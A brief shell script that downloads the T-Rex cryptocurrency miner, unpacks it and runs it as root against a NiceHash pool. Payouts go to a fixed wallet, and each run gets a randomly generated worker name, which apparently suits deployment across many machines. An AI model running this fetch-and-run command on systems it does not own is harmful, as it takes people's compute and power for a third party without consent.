#!/bin/sh
apt-get install libpci3 && wget https://trex-miner.com/download/t-rex-0.19.14-linux-cuda11.1.tar.gz && tar -xvf t-rex-0.19.14-linux-cuda11.1.tar.gz && sudo ./t-rex -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 3KxQKbnkxvMKu9WEP38tpfVcnsrmfV4iCJ.$(echo $(shuf -i 2-100 -n 1)-$(shuf -i 1-1000 -n 1)-forth) -p x
